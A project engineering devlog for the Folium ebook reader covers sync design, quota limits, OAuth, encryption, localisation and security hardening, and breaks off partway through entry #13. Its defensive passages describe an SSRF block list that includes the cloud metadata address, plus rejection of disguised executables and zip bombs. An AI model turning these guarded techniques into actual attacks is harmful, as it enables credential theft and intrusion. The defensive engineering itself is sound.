# Folium Engineering Devlogs 📓

> **Confidential & Proprietary**  
> Chronological development journal documenting architectural decisions, technical breakthroughs, post-mortems, and engineering insights during the development of Folium.

---

## 📑 Index of Devlogs

- [Entry #01 (2026-09-17): The Genesis & The Local-First Manifesto](#entry-01-2026-09-17-the-genesis--the-local-first-manifesto)
- [Entry #02 (2026-09-17): Inlining Reader Engines & Zero-CDN Isolation](#entry-02-2026-09-17-inlining-reader-engines--zero-cdn-isolation)
- [Entry #03 (2026-09-18): The 100,000 D1 Writes/Day Dilemma & Adaptive Sync](#entry-03-2026-09-18-the-100000-d1-writesday-dilemma--adaptive-sync)
- [Entry #04 (2026-09-18): Production Deployment, Domain Setup & pnpm v11 in CI](#entry-04-2026-09-18-production-deployment-domain-setup--pnpm-v11-in-ci)
- [Entry #05 (2026-09-19): Release Desynchronization & The Multi-Platform Contract](#entry-05-2026-09-19-release-desynchronization--the-multi-platform-contract)
- [Entry #06 (2026-09-19): Synthesizing The 11-Phase Master Architecture](#entry-06-2026-09-19-synthesizing-the-11-phase-master-architecture)
- [Entry #07 (2026-09-19): Cloudflare D1 Quota Defense & The Edge Sync Engine](#entry-07-2026-09-19-cloudflare-d1-quota-defense--the-edge-sync-engine)
- [Entry #08 (2026-09-19): Google Drive Storage, OAuth & The Zero-Knowledge Privacy Vault](#entry-08-2026-09-19-google-drive-storage-oauth--the-zero-knowledge-privacy-vault)
- [Entry #09 (2026-09-19): Community Bookshelf, OPDS & Folder-as-a-Shelf Sync](#entry-09-2026-09-19-community-bookshelf-opds--folder-as-a-shelf-sync)
- [Entry #10 (2026-09-19): 30-Day Tombstone Retention & Bidirectional Deletion Sync](#entry-10-2026-09-19-30-day-tombstone-retention--bidirectional-deletion-sync)
- [Entry #11 (2026-09-22): Codebase Audit, Security Hardening & Zero-Knowledge Upgrades](#entry-11-2026-09-22-codebase-audit-p0p1p2-remediation-security-hardening--zero-knowledge-architecture-upgrades)
- [Entry #12 (2026-09-22): Full Codebase Localization (i18n) Supporting 7 Languages](#entry-12-2026-09-22-full-codebase-localization-i18n-supporting-7-languages)
- [Entry #13 (2026-09-28): Phase 8.8 Storage Armor & Zero-Exfiltration Sandbox](#entry-13-2026-09-28-phase-88-storage-armor-ingestion-gatekeeper--zero-exfiltration-sandbox)
- [Entry #14 (2026-10-02): Phase 10 Audio Narration (TTS) & Accessibility](#entry-14-2026-10-02-phase-10-audio-narration-tts--accessibility)
- [Entry #15 (2026-10-05): Sync Engine Hardening, Comprehensive LWW Conflict Resolution & Stale Client Invalidation](#entry-15-2026-10-05-sync-engine-hardening-comprehensive-lww-conflict-resolution--stale-client-invalidation)
- [Entry #16 (2026-10-05): Decoupling Google Drive Authentication from Dev Mode & Dynamic OAuth Client Configuration](#entry-16-2026-10-05-decoupling-google-drive-authentication-from-dev-mode--dynamic-oauth-client-configuration)
- [Entry #17 (2026-10-06): The Hall of Shame: Paranoid CI Secrets & Tryhard PKCE (Hotfixes #15 & #16)](#entry-17-2026-10-06-the-hall-of-shame-paranoid-ci-secrets--tryhard-pkce-hotfixes-15--16)
- [Entry #18 (2026-10-06): The Post-Audit Reality Check: Zombie Books, Amnesiac Caches, and the Sandbox That Wasn't (PR #17)](#entry-18-2026-10-06-the-post-audit-reality-check-zombie-books-amnesiac-caches-and-the-sandbox-that-wasnt-pr-17)

---

### Entry #01 (2026-09-17): The Genesis & The Local-First Manifesto

#### Context & Motivation
Most modern ebook readers on mobile and web have become bloated webview wrappers dependent on continuous cloud connectivity. When boarding an airplane or commuting underground, these applications often fail to load reader assets, freeze on network timeouts, or lock user data behind proprietary DRM and closed cloud vaults.

#### Architectural Direction
We initiated Folium with three fundamental tenets:
1. **Local-First Precedence**: Reading is a sacred, private activity. The reader engine and personal book database must reside 100% on the client device.
2. **Unified Monorepo**: Maintain a single codebase using Expo (React Native for iOS, Android, and Web) powered by `pnpm workspaces`.
3. **Edge-Driven Sync**: Rather than deploying bulky centralized servers, leverage lightweight Cloudflare Workers paired with Cloudflare D1 (Serverless SQLite at the edge) for eventual consistency across devices.

---

### Entry #02 (2026-09-17): Inlining Reader Engines & Zero-CDN Isolation

#### The Challenge
Standard implementations of `epub.js` and `pdf.js` rely heavily on dynamic CDN scripts, external web workers, and unbundled font assets. Under restrictive browser environments or offline conditions:
- Content Security Policies (CSP) block dynamic script evaluations.
- Missing internet connectivity turns reader frames blank.
- Canvas rendering for PDFs on high-density screens exhibits blurriness or incorrect viewport aspect ratios.

#### Technical Solution
1. **Inlined EPUB Engine (`apps/mobile/src/reader/EpubReader.tsx`)**:
   - Replaced all external CDN dependencies with bundled, inlined script injections.
   - Designed a bidirectional bridge between the host React Native component and the reader iframe.
   - Built a dynamic styling engine supporting Light, Sepia, and Dark themes with customizable font sizing (70% - 200%).
   - Adopted Canonical Fragment Identifiers (CFI) for sub-character reading position precision across reflowable viewports.
2. **Inlined PDF Engine (`apps/mobile/src/reader/PdfReader.tsx`)**:
   - Implemented an inlined Mozilla `pdf.js` bundle using blob-based web workers.
   - Handled high-DPI canvas scaling via `window.devicePixelRatio` compensation.
   - Built desktop-grade keyboard shortcuts: `←`/`→` for immediate page turning, `+`/`-` for font zoom, and `T` for distraction-free immersion mode.

---

### Entry #03 (2026-09-18): The 100,000 D1 Writes/Day Dilemma & Adaptive Sync

#### The Dilemma
When evaluating Cloudflare D1's free tier for our edge synchronization layer, we noticed a sharp asymmetric bottleneck:
- **Storage**: 5 GB (Generous for reading metadata).
- **Row Reads**: 5,000,000 rows/day (Extremely generous).
- **Row Writes**: **100,000 rows/day** (The critical constraint).

A naive synchronization architecture that writes reading positions on every page turn or scroll tick would consume 1,000 writes in under 30 minutes of active reading. With multiple devices, an active user would blow past the 100k daily write quota in a few days.

#### Architectural Fix: 4-Pillar Quota Defense
1. **100% Local SQLite Isolation**: All bookmark clicks, theme toggles, and reading progress updates write immediately to local device SQLite (0 network latency, 0 D1 writes).
2. **Adaptive Debouncing**: Sync requests are debounced on a 30-second idle threshold and prioritized on major lifecycle events:
   - When the user exits the reader screen to the library.
   - When the browser tab/app transitions to `background` or triggers `beforeunload`.
3. **Batch Upserts & Changeset Packing**: Changesets are aggregated into single SQL transactions (`INSERT INTO sync_mutations ... ON CONFLICT DO UPDATE`), collapsing 50 micro-events into exactly 1 database write.
4. **ETag & Hash Gating**: The worker computes an SHA-256 state hash for each client device, immediately returning `304 Not Modified` on unchanged sync pulls to eliminate redundant read/write cycles.

---

### Entry #04 (2026-09-18): Production Deployment, Domain Setup & pnpm v11 in CI

#### Context & Execution
With the web reader fully functional, we prepared Folium for production deployment:
1. **Production Domain (`https://aki.is-a.dev`)**:
   - Pointed the custom domain `aki.is-a.dev` to host Folium's static production bundle via GitHub Pages (`dannie203/dannie203.github.io`).
   - Cleaned all legacy blog traces from the personal GitHub Pages repository, migrating the previous blog ("Nhật Ký Lao Công") to a dedicated repository (`dannie203/blog`) deployed on Cloudflare Pages (`aki.is-a.bot`).
2. **Automated CI/CD Pipeline (`.github/workflows/deploy.yml`)**:
   - Generated dedicated ed25519 deploy keys allowing the private `dannie203/folium` repository to deploy directly to `dannie203/dannie203.github.io`.
   - Constrained deployment triggers strictly to the `main` branch.
3. **Debugging pnpm v11 in GitHub Actions**:
   - Encountered `[ERR_PNPM_IGNORED_BUILDS]` during CI due to pnpm v11's strict build script approval security policy on native packages (`canvas@2.11.2`).
   - Surgically patched `pnpm-workspace.yaml` with `canvas: false` under `allowBuilds:` and added `--config.strict-dep-builds=false` to the CI install command.
   - Result: GitHub Actions pipeline turned 100% green, completing full typecheck, Expo web bundle export, and deployment in 1m25s.

---

### Entry #05 (2026-09-19): Release Desynchronization & The Multi-Platform Contract

#### The Engineering Question
When shipping a multi-platform app spanning an Edge Worker (instant 5-second deployments) and an Expo Mobile client (1–3 days store review delay + fragmented user update adoption), how do we prevent backend releases from breaking older mobile apps running on users' devices?

#### Key Takeaways & Directives
1. **Git Branching Is Internal Only**: Splitting branches into `main` and `staging` organizes code, but does *not* protect against breaking changes in production because users update their mobile apps at wildly different times.
2. **Expand & Contract Pattern Is Mandatory**:
   - Never rename or drop columns in D1 in a single release.
   - Always expand the schema with nullable/default fields first, release the mobile update, and contract/prune obsolete fields only after telemetry confirms legacy adoption has ceased.
3. **Expo EAS Update (OTA) as First Responder**:
   - For JavaScript/TypeScript bug fixes and UI updates, utilize Expo EAS Update to push patches directly to mobile devices over CDN, bypassing store review delays entirely.
4. **Local Rules Codification**:
   - Formulated these rules into [AGENTS.md](file:///home/aki/folium/AGENTS.md) at the repository root, adding local rule files to `.gitignore` to maintain strict confidentiality and developer discipline.

---

### Entry #06 (2026-09-19): Synthesizing The 11-Phase Master Architecture

#### The Evolution of Scope
What originated as a 7-phase prototype (Monorepo, Library, EPUB, PDF, Notes, Google Drive, Sync) evolved significantly through production realities:
1. **The Web First-Mover**: Deploying the web application ahead of mobile store reviews created an active production environment (`aki.is-a.dev`) requiring immediate CI/CD automation.
2. **Quota Consciousness**: Evaluating real-world reading patterns against Cloudflare D1's 100k writes/day free-tier ceiling dictated dedicated architectural guardrails (debouncing, batch upserts, state hashing) elevated into its own dedicated phase.
3. **Ecosystem Depth**: Additional strategic capabilities emerged:
   - On-device Text-to-Speech (TTS) with sentence-synchronized reading.
   - Google Drive decoupled storage for massive books.
   - EAS OTA updates and Store submission readiness.
   - Freemium gating with RevenueCat / Stripe and Zero-Knowledge End-to-End Encryption.

#### The Resulting Master Architecture
We unified all architectural decisions into a synchronized **11-Phase Master Roadmap** (`roadmap.md`), establishing clear milestone boundaries from current core reader capabilities (Phase 1–5 complete, Phase 6 in progress) to long-term privacy-first cloud synchronization.

---

### Entry #07 (2026-09-19): Cloudflare D1 Quota Defense & The Edge Sync Engine

#### Context & Objectives
While Cloudflare D1 provides generous bandwidth and row reads (5,000,000/day) on its free tier, its strict 100,000 writes/day ceiling poses an existential risk for an ebook reader if sync calls are triggered naively on every page turn or annotation. In Phase 7, we built the client-side sync engine (`apps/mobile/src/services/syncService.ts`) and hardened the edge worker (`packages/worker/src/index.ts`) around our **4-Pillar Quota Defense**.

#### Key Implementation Breakthroughs
1. **Outbox Compaction (Micro-Mutation Coalescing)**:
   - Page turns and scroll ticks write instantaneously to local SQLite/IndexedDB with 0 network latency.
   - When draining `sync_outbox`, the engine groups mutations by `entity_type` and `entity_id`. If a user turned 50 pages across 2 books during a reading session, those 50 rows collapse into exactly 2 `reading_progress` records before transmission, reducing write volume by >95%.
2. **Adaptive Sync Debouncing**:
   - Defer remote edge sync requests to a 30-second idle threshold during reading.
   - Automatically trigger immediate flushes on high-intent lifecycle transitions:
     - Navigating back from reader to bookshelf.
     - Native React Native `AppState` transitioning to `background` or `inactive`.
     - Browser window `beforeunload` and `visibilitychange` (`hidden`).
3. **ETag & State Hash Gating for Pulls**:
   - The worker assigns a monotonic integer `current_seq` per user.
   - The client includes `If-None-Match: W/"${last_synced_seq}"` and `?since=${last_synced_seq}`.
   - If no new mutations exist since `last_synced_seq`, the worker immediately exits with HTTP 304 / empty payload with ETag headers, bypassing all 5 D1 `SELECT` queries entirely.
4. **Resilient Local-First Offline Mode & Visual Sync State**:
   - Flaky connections or offline reading gracefully transition status to `offline` without blocking reader interactivity.
   - Transient edge failures trigger exponential backoff retries (1s, 2s, 4s... up to 60s max).
   - Designed `SyncStatusBadge` component integrated seamlessly into both the Bookshelf header and Reader toolbar with manual sync on tap and real-time status subscription.

---

### Entry #08 (2026-09-19): Google Drive Storage, OAuth & The Zero-Knowledge Privacy Vault

#### Context & Objectives
In Phase 8, we resolved two fundamental architectural challenges:
1. **Decoupled Heavy Storage**: Freeing the developer and server from hosting gigabytes of user ebook files (EPUB, PDF) by establishing a direct synchronization channel with personal Google Drive (`drive.file` scope).
2. **Zero-Knowledge Information Locking & Legal Shield**: Establishing an unassailable privacy vault (AES-256-GCM) that keeps user reading notes blind to external servers, paired with public Kerckhoffs cryptographic proof snippets and DMCA Safe Harbor statutory portals (`/privacy`, `/terms`, `/security`).

#### Key Implementation Breakthroughs
1. **Cross-Platform Google OAuth & Sandbox Fallback (`authService.ts`)**:
   - Integrated `expo-auth-session` supporting Web, iOS, and Android with PKCE authentication flow.
   - Designed a Developer Sandbox Fallback allowing instant testing and review without requiring active GCP OAuth credentials.
   - Persists access tokens and session state with automated expiry checking.
2. **Two-Way Google Drive Library Sync (`googleDriveService.ts`)**:
   - Creates and manages a dedicated `/Folium` folder in the user's personal Google Drive.
   - Implemented multipart upload (`multipart/related`) for EPUB and PDF binaries with custom `appProperties` metadata tagging.
   - Two-way library reconciliation: uploads unbacked local books and automatically detects and downloads missing books across secondary devices into local storage (`IndexedDB` / `FileSystem`).
3. **Client-Side Zero-Knowledge Encryption Vault (`cryptoService.ts`)**:
   - Utilizes WebCrypto `SubtleCrypto` for hardware-accelerated AES-256-GCM encryption with PBKDF2 key derivation (100,000 rounds of SHA-256).
   - Generates cryptographically random 16-byte salts and 12-byte IVs for each encrypted record.
   - Guarantees Cloudflare D1 and sync workers store exclusively blind Base64 ciphertext blobs — zero plaintext leakage and zero server-side key possession.
4. **Kerckhoffs Verification & Standalone Audit Snippet (`securityProofSnippet.ts`)**:
   - Published a zero-dependency, open-source audit snippet runnable in browser console or Node.js to mathematically verify that plaintext never touches external networks.
   - Integrated a live interactive benchmark into the `/security` route.
5. **Static Public Legal & Privacy Portal (`/privacy`, `/terms`, `/security`)**:
   - Pre-rendered static routes on `https://aki.is-a.dev`:
     - `/privacy`: Declares local-first architecture and justifies `drive.file` scope for Google OAuth verification.
     - `/terms`: Formal DMCA § 512 / OCILLA Safe Harbor statutory declaration and Notice-and-Takedown contact protocol.
     - `/security`: Interactive cryptographic proof inspector and threat model matrix.

---

### Entry #09 (2026-09-19): Community Bookshelf, OPDS & Folder-as-a-Shelf Sync

#### Context & Objectives
In Phase 8.5, we addressed open community catalog access and user-centric library organization:
1. **Public Domain Open Library & OPDS**: Free, legal access to high-quality books via standard OPDS (Open Publication Distribution System) feeds (Standard Ebooks, Project Gutenberg, Vietnamese Classics) and arbitrary custom OPDS endpoints.
2. **P2P Google Drive Sharing & Recursive Folder Traversal**: Direct sharing via public Google Drive folder links (`drive.google.com/drive/folders/...`) with multi-level nested scanning (`scanPublicFolderRecursive`), enabling community libraries without server file-hosting costs ($0 cloud cost).
3. **Folder-as-a-Shelf & Smart Inbox Subfolder Sync**: The user's Google Drive `/Folium` root acts as an inbox drop-box. Subfolders inside `/Folium` (e.g. `/Folium/Văn Học/`, `/Folium/Kỹ Thuật/`) map 1:1 to Shelves in the app, with two-way synchronization.
4. **User Agency & Zero Unsolicited Auto-Sorting**: In the wild, both EPUB and PDF files contain notoriously messy metadata (uploader tags, generic titles, scan file numbers). Machine auto-sorting creates frustration and misplaced files. Folium enforces strict user agency: incoming books default to `📥 Hộp thư đến (Inbox)`, and a quick long-press metadata editor empowers users to clean up Title, Author, Cover, and Shelf chips in seconds.

#### Key Implementation Breakthroughs
1. **OPDS Feed Parser & 1-Tap Import Engine (`opdsService.ts`)**:
   - Zero-dependency XML Atom feed parser converting OPDS XML into typed `OpdsBookEntry` models.
   - Built-in curated catalogs (Standard Ebooks, Project Gutenberg, Vietnamese Literature classics) and custom OPDS URL reader.
   - One-tap download and ingestion directly into local IndexedDB / SQLite storage.
2. **Recursive Public Drive Folder Scanner (`publicDriveService.ts`)**:
   - Parses public folder IDs from any standard Google Drive URL.
   - Deep recursive traversal (`scanPublicFolderRecursive`) navigating nested folders, extracting book metadata, covers, and direct download streams without mass-downloading gigabytes.
3. **Folder-as-a-Shelf Engine (`googleDriveService.ts`)**:
   - Creates and reconciles shelf subfolders on user's Google Drive.
   - Uploading a book on shelf "Văn Học" places it into `/Folium/Văn Học/` with `foliumShelf` metadata.
   - Drive sync queries both root and subfolders, correctly mapping dropped files into their respective shelf collections.
4. **Quick Metadata Editor & Dynamic Shelf Filter (`MetadataEditModal.tsx`, `index.tsx`, `community.tsx`)**:
   - Long-press any book card to adjust title, author, cover, or shelf tags.
   - Horizontally scrollable filter chips (`Tất cả`, `📥 Hộp thư đến`, dynamic shelves, `EPUB`, `PDF`) with active item counters.
   - Clean, high-performance community route (`/community`) providing tabbed navigation between public domain OPDS, shared Drive folders, and custom feeds.

---

### Entry #10 (2026-09-19): 30-Day Tombstone Retention & Bidirectional Deletion Sync

#### The Incident: HTTP 500 On Sync Push
During live mobile/web synchronization testing, client outbox pushes crashed with `Sync push failed (500): Internal Server Error`.
1. **Root Cause Diagnosis**:
   - In Cloudflare D1's initial migration (`0001_init.sql`), tables `books`, `bookmarks`, `highlights`, `notes`, and `reading_progress` enforced strict `NOT NULL` constraints on columns like `file_size`, `title`, `author`, `file_type`, `book_id`, and `cfi`.
   - When a user deleted a book or annotation locally, the client generated a tombstone mutation containing only `{ id, is_deleted: true }`.
   - The edge worker in `packages/worker/src/index.ts` passed raw properties to SQLite `.bind()`. Passing `undefined` resulted in SQL `NULL`, violating constraints and throwing unhandled SQLite exceptions that crashed the worker with HTTP 500.
   - Because HTTP 500 was returned, outbox rows were never deleted, creating an infinite retry deadlock.
2. **Resolution & Server Hardening**:
   - Wrapped `/api/sync/push` and `/api/sync/pull` in structured `try/catch` error handlers.
   - Provided resilient fallback defaults (`title = b.title || 'Chưa có tiêu đề'`, `file_size = b.file_size || 0`, `file_type = b.file_type || 'epub'`).
   - Implemented conditional conflict resolution (`title = CASE WHEN excluded.is_deleted = 0 ...`), guaranteeing that incoming deletion tombstones cannot overwrite existing book metadata with blank strings.

#### The Architectural Directive: 30-Day Tombstones & Bidirectional Deletion
In a distributed local-first system, server rows cannot simply be purged immediately (`DELETE FROM books WHERE id = ...`) upon deletion:
- If server deletes a row instantly, offline secondary devices pulling incremental updates via `GET /api/sync/pull?since=X` will never discover that the book was deleted, causing permanent cross-device state drift.
- Conversely, retaining tombstones indefinitely pollutes D1 storage and slows down B-Tree index scans.

#### Technical Solution:
1. **D1 Migration 0002 (`0002_tombstone_gc.sql`)**:
   - Added `deleted_at INTEGER` timestamp column across all 5 entities (`books`, `reading_progress`, `bookmarks`, `highlights`, `notes`).
   - Created partial indexes `WHERE is_deleted = 1` targeting `deleted_at` for sub-millisecond sweep execution.
2. **30-Day Automated Garbage Collection**:
   - Defined 30-day retention window: `const THIRTY_DAYS_MS = 30 * 24 * 60 * 60 * 1000;`.
   - Inlined a batch GC sweep inside sync push cycles and exposed an explicit endpoint `POST /api/sync/gc`.
   - Purges all tombstones where `is_deleted = 1 AND deleted_at < (now - 30 days)`.
3. **Bidirectional Deletion Sync (Client ⇄ Google Drive)**:
    - **Client ➔ Google Drive**: Deleting a book in Folium automatically calls `trashDriveBook(driveFileId)`, executing `PATCH /drive/v3/files/{id}` with `{ trashed: true }`. The book moves to Google Drive's native Trash folder (recoverable for 30 days), matching the exact 30-day lifecycle.
    - **Google Drive ➔ Client**: During `syncWithGoogleDrive()`, active Google Drive files (`trashed = false`) are reconciled against local books. If a book linked to Drive is no longer present or has been trashed in Drive, Folium automatically purges the local binary/SQLite entry and commits a tombstone to Cloudflare D1.
4. **Client UI Deletion & Quick Management (`MetadataEditModal.tsx`, `BookCard.tsx`, `index.tsx`)**:
   - Added a prominent "Xoá Sách" button to `MetadataEditModal` with confirmation dialogs tailored for each platform (`window.confirm` for web, `Alert.alert` for mobile).
   - Added quick options button (`EditPencilIcon`) on `BookCard` cover for 1-click access to editing and deletion on desktop/web without relying solely on long-press.
   - Connected UI deletion to the entire pipeline: local SQLite + local binary file removal + Google Drive Trash (`trashed: true`) + Cloudflare D1 tombstone outbox.

---

### Entry #11 (2026-09-22): Codebase Audit, P0/P1/P2 Remediation, Security Hardening & Zero-Knowledge Architecture Upgrades

#### Summary & Motivation
Following a comprehensive architectural and security review across the entire monorepo (`apps/mobile`, `packages/worker`, `packages/shared`), we identified and remediated critical risks spanning edge authentication, sync atomicity, SSRF defenses on the download proxy, and web platform storage stability.

#### 1. Edge Authentication & Performance (P0)
- **Migrated from Google UserInfo to ID Token (RS256 JWT)**:
  - Replaced per-request `fetch('https://www.googleapis.com/oauth2/v3/userinfo')` calls with local WebCrypto JWT verification (`crypto.subtle.verify`) using Google's public JWKS.
  - Eliminated high latency overhead and rate-limit bottlenecks on the edge worker.
  - Cached JWKS in-memory with automatic cache invalidation based on upstream `Cache-Control: max-age` and on-demand refresh on unknown `kid`.
  - Enforced strict validations: RS256 algorithm check, issuer (`accounts.google.com`), expiration with 60s skew tolerance, `nbf` claim, non-empty subject, and mandatory `expectedAudience` matching `GOOGLE_CLIENT_ID` to prevent confused deputy token reuse.
- **Sandbox Auth Gating**:
  - Gated `demo_` token bypass so it is only accepted when `ALLOW_DEMO_AUTH === 'true'` or `ENVIRONMENT === 'development'`, eliminating sandbox backdoors in production.

#### 2. Sync Engine Atomicity & Multi-Tenant Data Isolation (P0/P1)
- **Coupled Sequence Increment into Atomic Batch**:
  - Moved the `user_sync_sequence` increment inside the primary `statements[]` array for `db.batch()`. If any mutation fails, the sequence does not advance, eliminating torn sequence desynchronization.
  - Added monotonic sequence guard: `current_seq = CASE WHEN excluded.current_seq > user_sync_sequence.current_seq THEN excluded.current_seq ELSE user_sync_sequence.current_seq + 1 END`.
- **Multi-Tenant Tombstone GC**:
  - Scoped all 5 tombstone garbage collection `DELETE` statements (`books`, `reading_progress`, `bookmarks`, `highlights`, `notes`) with `WHERE user_id = ?` in both push and maintenance GC endpoints, preventing cross-tenant data corruption for offline clients.
- **D1 Quota & Statement Batching Defense**:
  - Implemented automatic batch chunking (≤ 100 statements per `db.batch()`) on the worker to respect Cloudflare D1's 128-statement limit.
  - Chunked outbox reading on client to `LIMIT 50` rows per push and converted outbox row deletion to a single batch `DELETE ... WHERE id IN (...)`.

#### 3. Web Platform & Offline Engine Upgrades (P1)
- **SQLite Web Engine Migration (IndexedDB SQL Parser Replacement)**:
  - Replaced the fragile 713-line regex/string-matching IndexedDB SQL parser (`index.web.ts`) with real WebAssembly SQLite (`sql.js`).
  - Web now executes identical SQLite queries, triggers, and migrations as native platforms.
  - Binary database persisted to IndexedDB (`folium_sqlite_persistence`) with debounced auto-save.
  - Added `flushImmediately()` hooked into `beforeunload` and `visibilitychange` to eliminate the 150ms data loss window on tab close or window switch.
- **Client Sync Resilience on Web**:
  - Added `keepalive: true` on web push requests to survive page navigation and browser tab closures.

#### 4. SSRF Defense & OPDS Catalog Hardening (P1/P2)
- **SSRF Defense on Download Proxy**:
  - Replaced automatic redirect following (`redirect: 'follow'`) with manual redirect resolution (`redirect: 'manual'`, up to 5 hops).
  - Every redirect hop is validated against: strict HTTPS protocol, port 443 only, official domain allowlist (`standardebooks.org`, `gutenberg.org`), and private/internal IP blocking (RFC 1918, loopback, link-local / cloud metadata `169.254.169.254`, IPv6, and raw IPs).
- **OPDS XML Parser Upgrade**:
  - Replaced fragile hand-rolled regex parser with `fast-xml-parser` (`XMLParser`), supporting attributes, nested tags, and CDATA across OPDS Atom catalogs.

#### 5. Architectural Decomposition & Code Cleanup (P2)
- **Reader Hook Extraction**:
  - Decomposed the 1426 LOC `reader/[id].tsx` into 4 focused hooks: `useBookLoader`, `useReaderAnnotations`, `useReaderSettings`, and `useReaderKeyboard`.
  - Added settings persistence to SQLite `sync_meta` so typography, font size, and themes persist across sessions.
- **DriveSyncModal Separation**:
  - Extracted business logic into `useDriveSync` hook, decoupling UI rendering from OAuth and sync orchestration.
- **Native Icons & UI Reliability**:
  - Implemented `react-native-svg` rendering bridge in `Icons.tsx` replacing text fallbacks.
  - Hardened avatar initials in `DriveSyncModal` against empty name strings.
  - Cleaned up unused imports and dead styles across reader, modal, and icon components.

#### 6. Verification Suite
- **Expanded Security & Regression Test Suites**:
  - Created and expanded `tests/security/` with 21 automated tests run via `node --test` covering:
    - RS256 Google ID Token verification, JWKS public key resolution, aud mismatch, expired tokens, bit-flip tampered signatures, sandbox demo token gating.
    - Cloudflare D1 atomic batch rollback and sequence monotonicity under failure.
    - Multi-tenant tombstone GC isolation.
    - Statement chunking for D1 statement quotas.
    - SSRF proxy defense (domain allowlist, IP blocking, port rules).
    - Real `sql.js` WASM engine execution against production SQLite schema.
    - Zero-Knowledge AES-256-GCM encryption roundtrip and adversary tests.
- **Test Metrics**:
  - `pnpm typecheck`: 0 errors across 3 packages.
  - `pnpm test`: 21/21 passing (0 failing).
  - `npx expo export --platform web`: 9/9 static routes cleanly bundled.

### Entry #12 (2026-09-22): Full Codebase Localization (i18n) Supporting 7 Languages

#### Summary & Motivation
Completed full internationalization (i18n) across the entire Folium client codebase, removing hardcoded UI strings in favor of a lightweight, strongly typed, zero-runtime-overhead React Context architecture. Added complete translations for 7 languages: Vietnamese (`vi`), English (`en`), Japanese (`ja`), Simplified Chinese (`zh`), French (`fr`), Spanish (`es`), and German (`de`).

#### 1. Architecture & Type Safety
- **Typed Keys & Fallbacks (`apps/mobile/src/i18n/types.ts`)**:
  - Comprehensive `TranslationKey` union covering all navigation, bookshelf, reader, drive sync, metadata editor, community OPDS, and sync badge strings.
  - TypeScript strictly enforces key existence at compile-time via `pnpm typecheck`.
- **Dynamic Parameter Interpolation (`apps/mobile/src/i18n/index.tsx`)**:
  - Built-in parameter substitution: `t('reader.pageOf', { page: 12, total: 150, percent: 8.0 })`.
  - Cascading fallback: `target locale` -> `en` -> `vi` -> raw key string.
  - Persistent language selection in SQLite (`sync_meta` key `app_locale`).
- **Complete Language Dictionaries (`apps/mobile/src/i18n/locales/`)**:
  - `vi.ts` (Tiếng Việt - default)
  - `en.ts` (English)
  - `ja.ts` (日本語)
  - `zh.ts` (简体中文)
  - `fr.ts` (Français)
  - `es.ts` (Español)
  - `de.ts` (Deutsch)

#### 2. Localized Views & Components
- **Settings Screen (`apps/mobile/app/settings.tsx`)**:
  - Converted the legacy 2-language toggle into an extensible `languageGrid` displaying all 7 supported languages with their native names and instant locale switching.
- **Bookshelf & Navigation**:
  - `BookshelfScreen` & `BookshelfHeader`: Search placeholders, file picker errors, and action tooltips.
  - `EmptyBookshelf`: Localized empty state titles, descriptions, and file selection CTA.
  - `ShelfFilterChips`: Localized "All" and "Inbox" filters.
  - `BookCard`: Reading progress (`{percent}%`), unread badges, and delete confirmation dialogues.
  - `BookshelfFooter` & `SidebarNav`: Localized library navigation, shelves list, cloud status, and legal links.
  - `BottomTabBar`: Localized mobile navigation labels.
- **Reader Experience (`apps/mobile/app/reader/[id].tsx` & `useReaderAnnotations.ts`)**:
  - Localized drawer tabs: Table of Contents, Bookmarks, Highlights & Notes, Search.
  - Search placeholder, empty query prompt, and "no results found" messaging.
  - Floating text selection card: "Highlight & Note", color palette, and note input.
  - Reader appearance modal: Theme options (Dark, Sepia, Light), font size adjustments, and keyboard shortcut cheatsheet.
  - Page navigation controls, progress indicators, and toast notifications.
- **Modals & Badges**:
  - `DriveSyncModal`: OAuth login cards, Google Drive status, sync result breakdowns, and Zero-Knowledge security notices.
  - `MetadataEditModal`: Book title, author, shelf category, cover URL, and delete confirmations.
  - `SyncStatusBadge`: Real-time status indicators (Synced, Syncing, Offline, Error), pending count, and modal info dialogs.
- **Community & OPDS (`apps/mobile/app/community.tsx`)**:
  - OPDS catalog tabs, loading spinners, download status buttons ("Download to Library", "In Library").
  - Google Drive folder scanner inputs, recursive scan feedback, and import buttons.
  - Custom OPDS catalog feed inputs and validation alerts.

#### 3. Verification & Build
- `pnpm typecheck`: 0 errors across monorepo.
- `pnpm test`: 21/21 security and regression tests passing.
- `npx expo export --platform web`: All 9 static routes cleanly bundled with zero asset errors.

### Entry #13 (2026-09-28): Phase 8.8 Storage Armor, Ingestion Gatekeeper & Zero-Exfiltration Sandbox

#### Summary & Motivation
Implemented Phase 8.8 of the Folium roadmap across the client and reader engines to protect local storage (SQLite/IndexedDB) and Google Drive bandwidth from corrupt files, malicious disguised binaries (PE/ELF/Mach-O/scripts), and Zip Bomb DoS payloads. Hardened reader sandboxing with zero-network Content Security Policies (Super CSP) and W3C SVG script quarantine.

#### 1. Ingestion Gatekeeper & Storage Abuse Firewall (`apps/mobile/src/services/fileValidator.ts`)
- **Magic Bytes Validation**:
  - **PDF**: Verified `%PDF-` (`0x25 0x50 0x44 0x46`) header and end-of-file trailer `%%EOF` within the last 1024 bytes.
  - **EPUB**: Validated Local File Header `PK\x03\x04` and IDPF/W3C OCF uncompressed `mimetype` entry starting with exact ASCII string `application/epub+zip`.
- **Storage Abuse Firewall**:
  - Added pre-flight rejection of disguised Windows PE executables (`MZ` / `0x4D 0x5A`), Linux ELF binaries (`\x7fELF`), Unix shell scripts (`#!`), and Mach-O binaries.
  - Integrated gatekeeper checks before writing to local SQLite / IndexedDB (`bookService.ts`, `opdsService.ts`, `publicDriveService.ts`) and before/after Google Drive transmission (`googleDriveService.ts`).
  - Completely cuts off Google Drive upload APIs when an invalid binary is encountered, protecting user quota and account standing.

#### 2. Decompression Defense (Zip Bomb & DoS Shield)
- **Central Directory Pre-Flight Scan**:
  - Traverses ZIP End of Central Directory (`PK\x05\x06`) and all Central Directory entry headers (`PK\x01\x02`) *before* any in-memory inflation or buffer allocation.
- **Safety Ceiling Enforcement**:
  - `MAX_TOTAL_UNCOMPRESSED_SIZE`: Caps cumulative uncompressed size at 300 MB.
  - `MAX_DECOMPRESSION_RATIO`: Rejects single entries or archives exceeding 100:1 compression ratio.
  - `MAX_ENTRY_COUNT`: Caps maximum archive inner files at 2,000 to prevent directory tree exhaustion attacks.

#### 3. Zero-Exfiltration Sandbox & SVG Quarantine
- **Super CSP (Zero-Network Content Security Policy)**:
